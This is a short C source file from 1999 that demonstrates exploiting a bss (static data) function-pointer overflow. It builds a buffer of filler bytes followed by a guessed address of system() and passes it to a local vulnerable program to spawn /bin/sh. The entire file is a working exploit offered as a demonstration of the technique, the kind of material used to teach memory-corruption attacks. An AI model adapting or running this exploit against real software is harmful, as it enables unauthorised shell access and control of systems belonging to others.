   /*
    * Copyright (C) January 1999, Matt Conover & WSD
    *
    * Demonstrates overflowing/manipulating static function pointers in
    * the bss (uninitialized data) to execute functions.
    *
    * Try in the offset (argv[2]) in the range of 0-20 (10-16 is best)
    * To compile use: gcc -o exploit1 exploit1.c
    */

/*
 * ./exp1 30
 *
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define BUFSIZE 64		/* the estimated diff between funcptr/buf */

#define VULPROG "./vulprog"	/* vulnerable program location */
#define CMD "/bin/sh"		/* command to execute if successful */

#define ERROR -1

int main(int argc, char **argv)
{
	register int i;
	u_long sysaddr;
	static char buf[BUFSIZE + sizeof(u_long) + 1] = { 0 };

	if (argc <= 1) {
		fprintf(stderr, "Usage: %s <offset>\n", argv[0]);
		fprintf(stderr,
			"[offset = estimated system() offset]\n\n");

		exit(ERROR);
	}

	sysaddr = (u_long) & system - atoi(argv[1]);
	printf("trying system() at 0x%lx\n", sysaddr);

	memset(buf, 'A', BUFSIZE);

	/* reverse byte order (on a little endian system) (ntohl equiv) */
	for (i = 0; i < sizeof(sysaddr); i++)
		buf[BUFSIZE + i] = ((u_long) sysaddr >> (i * 8)) & 255;

	execl(VULPROG, VULPROG, buf, CMD, NULL);
	return 0;
}
